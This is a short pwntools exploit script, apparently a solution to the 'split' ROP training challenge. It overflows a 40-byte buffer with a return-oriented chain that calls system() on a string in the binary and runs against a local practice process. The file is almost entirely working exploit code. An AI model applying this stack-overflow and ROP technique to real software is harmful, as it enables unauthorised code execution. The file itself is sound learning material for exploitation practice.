#! /bin/python2
from pwn import *

elf = context.binary = ELF('split')

context.log_level = 'debug'

cat_addr = 0x601060
system = 0x400810
gadget = 0x400883
info("target string: %#x", cat_addr)
info("address of system(): %x", system)
info("gadget: %x", gadget)

rop_chain = p64(gadget, endian='little')
rop_chain += p64(cat_addr, endian='little')
rop_chain += p64(system, endian='little')

payload = "A"*40 + rop_chain
print(payload.encode('hex'))

io = process(elf.path)

io.sendline(payload)
io.wait_for_close()
io.recv()
